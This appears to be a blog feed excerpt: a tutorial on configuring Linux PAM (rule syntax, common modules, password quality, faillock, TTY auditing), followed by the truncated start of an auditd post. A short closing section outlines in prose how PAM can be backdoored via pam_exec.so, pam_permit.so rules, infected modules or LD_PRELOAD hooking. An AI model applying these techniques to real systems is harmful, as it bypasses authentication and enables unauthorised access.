<p>PAM&rsquo;s main feature is the module configuration it offers. PAM looks at these text configuration files to determine what security actions to take for an application, and the administrator can add or remove new rules at any time. PAM is also extensible, which means that if we want to add new features (such as 2FA/MFA), we only need to change a few files and <code>login</code> can now use them.</p>
<p>In RedHat based systems, all of the pam config files can be easily located with the below command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ rpm -ql pam | grep /etc
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/etc/pam.d
</span></span><span class="line"><span class="cl">/etc/pam.d/config-util
</span></span><span class="line"><span class="cl">/etc/pam.d/fingerprint-auth
</span></span><span class="line"><span class="cl">/etc/pam.d/other
</span></span><span class="line"><span class="cl">/etc/pam.d/password-auth
</span></span><span class="line"><span class="cl">/etc/pam.d/postlogin
</span></span><span class="line"><span class="cl">/etc/pam.d/smartcard-auth
</span></span><span class="line"><span class="cl">/etc/pam.d/system-auth
</span></span><span class="line"><span class="cl">/etc/security
</span></span><span class="line"><span class="cl">/etc/security/access.conf
</span></span><span class="line"><span class="cl">/etc/security/chroot.conf
</span></span><span class="line"><span class="cl">/etc/security/console.apps
</span></span><span class="line"><span class="cl">/etc/security/console.handlers
</span></span><span class="line"><span class="cl">/etc/security/console.perms
</span></span><span class="line"><span class="cl">/etc/security/console.perms.d
</span></span><span class="line"><span class="cl">/etc/security/group.conf
</span></span><span class="line"><span class="cl">/etc/security/limits.conf
</span></span><span class="line"><span class="cl">/etc/security/limits.d
</span></span><span class="line"><span class="cl">/etc/security/limits.d/20-nproc.conf
</span></span><span class="line"><span class="cl">/etc/security/namespace.conf
</span></span><span class="line"><span class="cl">/etc/security/namespace.d
</span></span><span class="line"><span class="cl">/etc/security/namespace.init
</span></span><span class="line"><span class="cl">/etc/security/opasswd
</span></span><span class="line"><span class="cl">/etc/security/pam_env.conf
</span></span><span class="line"><span class="cl">/etc/security/sepermit.conf
</span></span><span class="line"><span class="cl">/etc/security/time.conf
</span></span></code></pre></div><p>There are two main directories here: <code>/etc/pam.d</code> and <code>/etc/security</code>. Both of these directories play important roles in configuring PAM behaviour.</p>
<p>Each file in the <code>/etc/pam.d</code> folder contains rules that are read by PAM at runtime. If the user attempts to login via <code>ssh</code>, he must be authenticated. PAM checks rules from the <code>sshd</code> file in the <code>/etc/pam.d/</code> folder after <strong>sshd</strong> sends an authentication request to PAM. If the file is present, the file&rsquo;s rules are read and a proper response is returned to the application. If the file is missing, the default behaviour is to read the rules from <code>other</code> file in same directory and act on them.</p>
<p>Let&rsquo;s take a look at <code>/etc/pam.d/</code> folder to get better picture of what&rsquo;s in it.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ls -l /etc/pam.d
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  192 Feb  2  2021 chfn
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  192 Feb  2  2021 chsh
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  232 Apr  1  2020 config-util
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  287 Jan 13  2022 crond
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   19 Nov 18 13:01 fingerprint-auth -&gt; fingerprint-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  702 Nov 18 13:01 fingerprint-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  796 Feb  2  2021 login
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  154 Apr  1  2020 other
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  188 Apr  1  2020 passwd
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   16 Nov 18 13:01 password-auth -&gt; password-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root 1033 Nov 18 13:01 password-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  155 Jan 25  2022 polkit-1
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   12 Nov 18 13:01 postlogin -&gt; postlogin-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  330 Nov 18 13:01 postlogin-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  681 Feb  2  2021 remote
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  143 Feb  2  2021 runuser
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  138 Feb  2  2021 runuser-l
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   17 Nov 18 13:01 smartcard-auth -&gt; smartcard-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  752 Nov 18 13:01 smartcard-auth-ac
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   25 Nov 18 12:57 smtp -&gt; /etc/alternatives/mta-pam
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root   76 Apr  1  2020 smtp.postfix
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  904 Nov 24  2021 sshd
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  540 Feb  2  2021 su
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  200 Oct 14  2021 sudo
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  178 Oct 14  2021 sudo-i
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  137 Feb  2  2021 su-l
</span></span><span class="line"><span class="cl">lrwxrwxrwx. 1 root root   14 Nov 18 13:01 system-auth -&gt; system-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root 1031 Nov 18 13:01 system-auth-ac
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root  129 Sep  1 14:57 systemd-user
</span></span><span class="line"><span class="cl">-rw-r--r--. 1 root root   84 Nov 24  2021 vlock
</span></span></code></pre></div><p>There are more files than what the rpm command above revealed. The reason for this is straightforward: we examined files installed by the <code>pam</code> package itself. Other files are installed by the packages that they belong to. The <code>openssh-server</code> package, for example, installed the <code>sshd</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ rpm -qf /etc/pam.d/sshd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">openssh-server-7.4p1-22.el7_9.x86_64
</span></span></code></pre></div><p>We now know that pam has rule files for each application as well as a default <code>other</code> file for all applications that do not have dedicated rule files. We won&rsquo;t always need this, but it&rsquo;s a good idea to keep it in the back of our minds.</p>
<p>Let&rsquo;s take a closer look at these rules from the <code>sshd</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/sshd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#%PAM-1.0
</span></span><span class="line"><span class="cl">auth	   required	pam_sepermit.so
</span></span><span class="line"><span class="cl">auth       substack     password-auth
</span></span><span class="line"><span class="cl">auth       include      postlogin
</span></span><span class="line"><span class="cl"># Used with polkit to reauthorize users in remote sessions
</span></span><span class="line"><span class="cl">-auth      optional     pam_reauthorize.so prepare
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">account    required     pam_nologin.so
</span></span><span class="line"><span class="cl">account    include      password-auth
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">password   include      password-auth
</span></span><span class="line"><span class="cl"># pam_selinux.so close should be the first session rule
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">session    required     pam_selinux.so close
</span></span><span class="line"><span class="cl">session    required     pam_loginuid.so
</span></span><span class="line"><span class="cl"># pam_selinux.so open should only be followed by sessions to be executed in the user context
</span></span><span class="line"><span class="cl">session    required     pam_selinux.so open env_params
</span></span><span class="line"><span class="cl">session    required     pam_namespace.so
</span></span><span class="line"><span class="cl">session    optional     pam_keyinit.so force revoke
</span></span><span class="line"><span class="cl">session    include      password-auth
</span></span><span class="line"><span class="cl">session    include      postlogin
</span></span><span class="line"><span class="cl"># Used with polkit to reauthorize users in remote sessions
</span></span><span class="line"><span class="cl">-session   optional     pam_reauthorize.so prepare
</span></span></code></pre></div><p>Lines beginning with <code>#</code> are clearly identified as comments, while the rest of the lines contain a single rule in a line.</p>
<p>Each rule follows a similar structure but uses different keywords. The generic rule syntax looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type    control    module [modules arguments]
</span></span></code></pre></div><p>There are 4 types of <code>type</code> in the PAM rules file.</p>
<ul>
<li><strong>auth</strong> : rules for authentication.</li>
<li><strong>account</strong> : rules for account management, like expired passwords and allowed time of login.</li>
<li><strong>password</strong> : rules for password management, like checking password quality. These rules are only used when applications are changing the password used for auth.</li>
<li><strong>session</strong> : rules for session management. They typically run at the start or end of the session.</li>
</ul>
<p>And there are 6 common types of <code>control</code>:</p>
<ul>
<li><strong>required</strong> : if it fails, everything fails; if it passes, go to next.</li>
<li><strong>sufficient</strong> : if it passes, everything passes; if it fails, go to next.</li>
<li><strong>requisite</strong> : same as required- but stops on error.</li>
<li><strong>optional</strong> : pam ignores it (pass or fail); if this is the only module in stack then it decides if fail or pass.</li>
<li><strong>include</strong> : include rules from other pam files. if stack fails, return control to application.</li>
<li><strong>substack</strong> : works like include. but if the substack fails, return to the parent stack instead of giving control back to application.</li>
</ul>
<p>The <code>module</code> (and any parameters, if any) follows. By default, PAM will look for modules in the <code>/usr/lib64/security</code> directory, but you can prevent this behaviour by specifying the absolute path of the module. Some modules rely on external configuration files, which can be found in the <code>/etc/security</code> directory.</p>
<h3 id="few-common-modules">Few common modules</h3>
<p>Before delving into the actual PAM rules files, we should first understand how a few of the most common modules behave. This will make interpreting the rules from the rules file much easier.</p>
<ul>
<li><code>pam_succeed_if.so</code></li>
</ul>
<p>This module is designed to succeed or fail auth based on the characterstics of the user trying to log in and the arguments passed to the module. If all the arguments passed to the module matches the characterstics of the user trying to log in, then and only then, this module returns success.</p>
<ul>
<li><code>pam_selinux.so</code></li>
</ul>
<p>This command sets the apropriate selinux security context. This can be used to set context when a session starts and restore it back.</p>
<ul>
<li><code>pam_permit.so</code></li>
</ul>
<p>This is the simplest of all. It just permits acess and does nothing else. With that said, you should consider this module very dangerous in wrong hands.</p>
<ul>
<li><code>pam_limits.so</code></li>
</ul>
<p>As its name suggests, this module sets the limits on the system resources for a user-session. Root user(uid=0) are also affected with this module.</p>
<p>There are many limits that can be configured, so there is a dedicated folder to host configuration files for it - <code>/etc/security/limits.d</code>. Alternatively, there is a <code>/etc/security/limits.conf</code> file. But its a good practice to have separate config files if possible.</p>
<ul>
<li><code>pam_pwquality.so</code></li>
</ul>
<p>This module was developed by RedHat. The only action of this module is to prompt the user for the password and check its strength. To check its strenght, the modules uses a dictionary (of weak password) to see it the entered password is part of it. If the password is not in the list, then that password is checked against a set of rules defined by admin.</p>
<p>These rules are configurable either by the use of module arguments or <code>/etc/security/pwquality.conf</code> config file.</p>
<ul>
<li><code>pam_rootok.so</code></li>
</ul>
<p>This rule authenticates the user if the real uid is 0. No questions asked!</p>
<p>If you don&rsquo;t know about what is a real and effective UID, read this <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup>.</p>
<ul>
<li><code>pam_faildelay.so</code></li>
</ul>
<p>This module sets the delay on failure. Like when a user types wron password, it fails and the next prompt is delayed by this module. If the delay is not given, then it will use <code>FAIL_DELAY</code> from <code>/etc/login.defs</code>.</p>
<ul>
<li><code>pam_unix.so</code></li>
</ul>
<p>This is the standard unix authnetication module. Usually it uses <code>/etc/passwd</code> and <code>/etc/shadow</code> (if shadow is enabled) to authenticate the user. There are many tasks that can be performed by this module like checking the expire or last change of the password.</p>
<p>The session component of this module logs when user logins or logs out of the system.</p>
<ul>
<li><code>pam_deny.so</code></li>
</ul>
<p>Just like <code>pam_permit.so</code>, this module is very simple and straightforward. This denies the access to everybody.</p>
<ul>
<li><code>pam_warn.so</code></li>
</ul>
<p>This module logs the service, terminal, user, or anything to syslog. This module always return <code>PAM_IGNORE</code>, so it just log events and have no participation in authentication process apart from that.</p>
<p>We&rsquo;re almost there now. Before we go any further, there are a few more things we should consider:</p>
<ul>
<li>
<p>PAM rules are parsed from top to bottom. If a <em>sufficient</em> rule is passed, then none of the below rules will be checked.</p>
</li>
<li>
<p>Some of the rules start with <code>-</code> character, indicating that PAM should ignore them silently if the module is missing.</p>
</li>
<li>
<p>If you want to know anything about a module, there is usually a man page available. The majority of the manpages for these modules provide examples of usage and return types.</p>
</li>
<li>
<p>Making changes to PAM files has immediate effect. You do not need to restart. As a result, it&rsquo;s a good idea to keep a backup of the files before making any changes.</p>
</li>
<li>
<p>Any error in the PAM files has the potential to log you out of your system permanently. Keeping a live root shell while testing is therefore beneficial. If you made a mistake, you can undo your changes using this shell.</p>
</li>
</ul>
<h2 id="usecases">Usecases</h2>
<h3 id="enforcing-strong-passwords">enforcing strong passwords</h3>
<p>Let&rsquo;s apply everything we&rsquo;ve learned so far to observe how PAM responds to password changes made with the <code>passwd</code> utility.</p>
<p>We now know that the <code>/etc/pam.d/passwd</code> file will be used by passwd (if it exists; else, <code>/etc/pam.d/other</code> will be read). This file will provide the procedures to be followed when sshd is used for any type of <a href="https://www.cloudflare.com/learning/access-management/authn-vs-authz/">authentication and authorization</a>.</p>
<p>This makes it obvious for us to go and checkout the <code>/etc/pam.d/passwd</code> file&hellip;</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/passwd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#%PAM-1.0
</span></span><span class="line"><span class="cl">auth       include	system-auth
</span></span><span class="line"><span class="cl">account    include	system-auth
</span></span><span class="line"><span class="cl">password   substack	system-auth
</span></span><span class="line"><span class="cl">-password   optional	pam_gnome_keyring.so use_authtok
</span></span><span class="line"><span class="cl">password   substack	postlogin
</span></span></code></pre></div><p>Analysing this file let us know that this module <strong>includes</strong> <code>system-auth</code> rules file. So we&rsquo;ll now inspect the rules mentioned in <code>/etc/pam.d/system-auth</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat /etc/pam.d/system-auth
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">#%PAM-1.0
</span></span><span class="line"><span class="cl"># This file is auto-generated.
</span></span><span class="line"><span class="cl"># User changes will be destroyed the next time authconfig is run.
</span></span><span class="line"><span class="cl">auth        required      pam_env.so
</span></span><span class="line"><span class="cl">auth        required      pam_faildelay.so delay=2000000
</span></span><span class="line"><span class="cl">auth        sufficient    pam_unix.so nullok try_first_pass
</span></span><span class="line"><span class="cl">auth        requisite     pam_succeed_if.so uid &gt;= 1000 quiet_success
</span></span><span class="line"><span class="cl">auth        required      pam_deny.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">account     required      pam_unix.so
</span></span><span class="line"><span class="cl">account     sufficient    pam_localuser.so
</span></span><span class="line"><span class="cl">account     sufficient    pam_succeed_if.so uid &lt; 1000 quiet
</span></span><span class="line"><span class="cl">account     required      pam_permit.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
</span></span><span class="line"><span class="cl">password    required      pam_deny.so
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">session     optional      pam_keyinit.so revoke
</span></span><span class="line"><span class="cl">session     required      pam_limits.so
</span></span><span class="line"><span class="cl">-session     optional      pam_systemd.so
</span></span><span class="line"><span class="cl">session     [success=1 default=ignore] pam_succeed_if.so service in crond quiet use_uid
</span></span><span class="line"><span class="cl">session     required      pam_unix.so
</span></span></code></pre></div><p>Only the <code>password</code> <strong>type</strong> is relevant for our intended task out of all of these rules.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=
</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
</span></span><span class="line"><span class="cl">password    required      pam_deny.so
</span></span></code></pre></div><ul>
<li><code>requisite	pam_pwquality.so try_first_pass local_users_only retry=3 authtok_type=</code></li>
</ul>
<p>This rule checks the quality of password using some predefined configuration that are mentioned in <code>/etc/security/pwquality.conf</code> or can be explicitely dictated via module arguments. The <code>try_first_pass</code> option tells to load the password from previous rule (if any), else this module will make prompt user for password. <code>local_users_only</code> option will tell <code>pam_pwquality.so</code> module to ignore the users that are not in the <code>/etc/passwd</code> file. <code>retry</code> option is the number of tries a user gets to pick an acceptable password before the module returns an error. By default, the prompt the user gets when entering their password is &ldquo;New password:&rdquo;. If the administrator sets <code>authtok_type=FOO</code>, the prompt becomes &ldquo;New FOO password:&rdquo;. Here the default behaviour will be expected.</p>
<ul>
<li><code>sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok</code></li>
</ul>
<p>For pam_unix, the sha512 option means use a password hashing routine based on the SHA512 algorithm. blowfish is also supported along with several other, less secure, choices. The shadow option means maintain password hashes in a separate /etc/shadow file that is only readable by the root user. This option should always be set. nullok means allow user accounts that have null password entries. Personally, I would recommend removing this option.</p>
<ul>
<li><code>required pam_deny.so</code></li>
</ul>
<p>If the above modules failed, this should return with a deny message.</p>
<p>Now, say you want to enforce the following policy&hellip;</p>
<pre><code>- prompt 2 times for password in case of an error (retry option)
- 12 characters minimum length
- at least 6 characters should be different from old password when entering a new one (difok option)
- at least 1 digit (dcredit option)
- at least 1 uppercase (ucredit option)
- at least 1 lowercase (lcredit option)
- at least 1 other character (ocredit option)
- cannot contain the words &quot;qwerty&quot; and &quot;password&quot;
- enforce the policy for root as well.
</code></pre>
<p>&hellip; necessary changes that are needed to make are as below</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">password    requisite     pam_pwquality.so try_first_pass local_users_only retry=2 minlen=12 difok=6 dcredit=-1 ucredit=-1 ocredit=-1 lcredit=-1 [badwords=qwerty password] enforce_for_root
</span></span><span class="line"><span class="cl">password    sufficient    pam_unix.so sha512 shadow nullok try_first_pass use_authtok
</span></span><span class="line"><span class="cl">password    required      pam_deny.so
</span></span></code></pre></div><p>The changes to the <code>system-auth</code> file described above will affect all applications that rely on that rule file. If changes are made to the <code>passwd</code> file, they will only affect the <code>passwd</code> utility.</p>
<p>We can also use the <code>authconfig</code> utility to make nearly all of these changes without having to interact directly with the associated files.
More information can be found <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd">here</a> . <sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></p>
<h3 id="lock-out-at-multiple-failed-attempts">lock out at multiple failed attempts</h3>
<p>We can also use PAM to configure the system so that if a single user makes multiple failed attempts, the PAM will lock out that user for a set period of time. Similarly to how your mobile device locks out the user for the next few hours if multiple login attempts fail.</p>
<p>This is possible with the <code>pam faillock</code> module. Because there is no dedicated config file for this module, all configuration will be done through module arguments. You can either manually edit the rule files with your favourite text editor or use the authconfig utility to make changes.</p>
<p>Before you begin, you must determine whether or not <code>pam_faillock</code> is enabled.
This can be verified using</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --test | grep pam_faillock
</span></span></code></pre></div><p>For me the default output was</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pam_faillock is disabled (deny=4 unlock_time=1200)
</span></span></code></pre></div><p>So I had to enable it via <code>authconfig --enablefaillock</code> and along with that you can pass module arguments via  <code>authconfig --faillockargs=&lt;module_options&gt;</code> flag.</p>
<p>Or, one can combine both of the actions in a single command like</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --enablefaillock --faillockargs=&#34;fail_interval=30 deny=3 unlock_time=3600&#34; --update
</span></span></code></pre></div><p>The above command will add <code>pam_faillock</code> rule in all of the relevant rules file (located in <code>/etc/pam.d/</code> directory). And the rest of the commands will configure the behaviour of the <code>pam_faillock</code> module. All of the module options can be checked with <code>man pam_faillock</code>.</p>
<p>Now the output of below command is slight different.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">authconfig --test | grep pam_faillock
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">pam_faillock is enabled (fail_interval=30 deny=3 unlock_time=3600)
</span></span></code></pre></div><p>You can list the failed login attempts with the <code>faillock</code> command.</p>
<h3 id="tty-auditing--cough--keylogging--cough">TTy auditing ( *cough*  keylogging  *cough*)</h3>
<p>Audit system (In Redhat or similar linux distros) uses <code>pam_tty_audit</code> PAM module for auditing of TTY input. When user logins, this module logs all keystrokes that user makes to <code>/var/log/audit/audit.log</code> file.</p>
<p>Since this depends on <code>auditd</code> service and requires that to be configured and running properly.</p>
<p>There is no <code>authconfig</code> flag that can enable this (atleast, there is none in centos 7.5), so we&rsquo;ll have to follow the traditional way of editing files manually to configure it.</p>
<p>This module only provides support for <strong>session</strong> type. That means we can only add <strong>session</strong> rules to our required files and it&rsquo;ll take effect immidiately for that service.</p>
<p>My idea is to add this rule in <code>/etc/pam.d/system-auth</code> and <code>/etc/pam.d/password-auth</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">session     required    pam_tty_audit.so  enable=*
</span></span></code></pre></div><p>The above rule will capture all of the tty inputs as it is and store them in <code>/var/log/audit/audit.log</code> file (by default). You can easily <code>grep</code> stuff from that or use a proper tool to query the logs&hellip; like <code>aureport</code>.</p>
<p><code>aureport --tty</code> command filters all <code>TYPE=tty</code> logs events from the file and display them in very human readable format.</p>
<h3 id="backdooring">backdooring</h3>
<p>Till this point, we have learnt a lot about PAM and it is time to rethink on the basics once again. PAM has 3 components: <strong>user</strong>, <strong>password</strong> and <strong>service</strong>. It&rsquo;s role is to authenticate a <em>user</em> to a <em>service</em> with provided <em>password</em>.</p>
<p>It works elegantly with the help of some service files of same name as of the service itself. These files are located in <code>/etc/pam.d/</code> directory. Each file has one or more rules that helps PAM to take proper decisions.</p>
<p>There are a lot of methods with which we can backdoor the PAM system. One of the many ways is to use <code>pam_exec.so</code> module to run an arbitrary command at each PAM based event. Another way could be to add rule using <code>pam_permit.so</code> module, that will skip the required checks to authenticate user for that service.</p>
<p>The above techniques are very noisy and are easily detected. More sophesticated attacks would include replacing the original module with custom compiled infected module on target system&hellip; or function hooking via <code>LD_PRELOAD</code> technique.</p>
<p>I&rsquo;ll leave the practical part upto you. Please don&rsquo;t do anything stupid or unethical on production server or any other system without the owner&rsquo;s consent.</p>
<p>Keep it healthy and stay safe!!</p>
<h2 id="resources">Resources:</h2>
<ul>
<li><a href="https://likegeeks.com/linux-pam-easy-guide/">https://likegeeks.com/linux-pam-easy-guide/</a></li>
<li><a href="https://aplawrence.com/Basics/understandingpam.html">https://aplawrence.com/Basics/understandingpam.html</a></li>
<li><a href="https://www.linux.com/news/understanding-pam/">https://www.linux.com/news/understanding-pam/</a></li>
<li><a href="https://developer.ibm.com/tutorials/l-pam/">https://developer.ibm.com/tutorials/l-pam/</a></li>
<li><a href="https://github.com/linux-pam/linux-pam">https://github.com/linux-pam/linux-pam</a> (Source code)</li>
<li><a href="https://wiki.archlinux.org/title/PAM#Examples">https://wiki.archlinux.org/title/PAM#Examples</a></li>
<li><a href="https://lwn.net/Articles/470764/">https://lwn.net/Articles/470764/</a> (A look at PAM face-recognition authentication)</li>
<li><a href="https://lwn.net/Articles/523199/">https://lwn.net/Articles/523199/</a> (Google Authenticator for multi-factor authentication)</li>
</ul>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p><a href="https://github.com/linux-pam/linux-pam/blob/b872b6e68a60ae351ca4c7eea6dfe95cd8f8d130/libpam/include/security/_pam_types.h#L29">https://github.com/linux-pam/linux-pam/blob/b872b6e68a60ae351ca4c7eea6dfe95cd8f8d130/libpam/include/security/_pam_types.h#L29</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>(<a href="https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id">https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id</a>)&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p><a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd">https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/system-level_authentication_guide/authconfig-pwd#authconfig-pwd-cmd</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Recording system events with auditd</title>
      <link>https://ayedaemon.github.io/post/2022/12/recording_system_events_with_auditd/</link>
      <pubDate>Sun, 11 Dec 2022 21:15:13 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2022/12/recording_system_events_with_auditd/</guid>
      <description>auditing linux systems with auditd</description>
      <content:encoded><![CDATA[<p>Audits are critical for system administrators to detect security violations and track security-relevant information on their systems.
Anyone concerned about the security, stability, and proper operation of their Linux servers should conduct an audit.</p>
<h2 id="how-to-do-auditing-in-linux">How to do auditing in linux</h2>
<p>One simple way is to use the <code>history</code> command to observe the shell&rsquo;s history, but this has many limitations. One of them is that this command is only applicable to the current user. You can still get around this by reading the <code>.bash_history</code> file in each user&rsquo;s home directory (given you have permissions to do so).</p>
<h3 id="audit-framework-in-kernel">Audit framework in kernel.</h3>
<p>The Linux audit framework is a better option.
Because it operates at the kernel level, it has a lot of visibility over almost everything. The Linux kernel sends significant events to user-space (<code>auditd</code>) so that they can be recorded in a file. This file can then be analysed on the host system or sent to a remote location for storage and analysis.</p>
<h2 id="user-space-auditd">User-space auditd</h2>
<p>The majority of Linux distributions come with <code>auditd</code> preinstalled, which begins and stops with the system (as a systemd service file). Using below command, you may determine whether the kernel was built using the audit options.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">grep -i audit /boot/config-`uname -r`
</span></span></code></pre></div><p>On my system, it gives me below output (indicating kernel was built with auditing feature)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">CONFIG_AUDIT_ARCH=y
</span></span><span class="line"><span class="cl">CONFIG_AUDIT=y
</span></span><span class="line"><span class="cl">CONFIG_AUDITSYSCALL=y
</span></span><span class="line"><span class="cl">CONFIG_AUDIT_WATCH=y
</span></span><span class="line"><span class="cl">CONFIG_AUDIT_TREE=y
</span></span><span class="line"><span class="cl">CONFIG_NETFILTER_XT_TARGET_AUDIT=m
</span></span><span class="line"><span class="cl">CONFIG_IMA_AUDIT=y
</span></span><span class="line"><span class="cl">CONFIG_KVM_MMU_AUDIT=y
</span></span></code></pre></div><p>Second thing you would want to check if the kernel thread process responsible for sending data to user-space is running. Check that with the <code>ps</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo ps -aux | grep -i kauditd
</span></span></code></pre></div><p>This gives me below output (indicating that the thread is running)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root       103  0.0  0.0      0     0 ?        S    11:39   0:00 [kauditd]
</span></span></code></pre></div><p>Final thing is to check the user-space service responsible to get the data from <code>kauditd</code>. To obtain definitive indications on systemd systems, use the commands listed below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">systemctl is-active auditd          ## Returns: active/inactive
</span></span><span class="line"><span class="cl">systemctl is-enabled auditd         ## Returns: enabled/disabled
</span></span></code></pre></div><p><em>(<strong>Note</strong>: Feel free to check the source code at <a href="https://elixir.bootlin.com/linux/latest/source/kernel/audit.c"><code>kernel/audit.c</code></a>. <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>)</em></p>
<h3 id="configuring-auditd">Configuring auditd</h3>
<p><code>Auditd</code> decides what to log and what not to log using a set of rules. These rules can be found in the <code>/etc/audit/rules.d/</code> folder. Auditd reads files from this folder on startup and generates the <code>/etc/audit/audit.rules</code> file automatically. <strong>(This file should not be edited by hand.)</strong></p>
<p><code>auditd</code> comes with a configuration file too. This file helps in changing the behaviour of the userspace <code>auditd</code> daemon. Default file on my system looks like below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># sudo cat -n /etc/audit/auditd.conf</span>
</span></span><span class="line"><span class="cl">
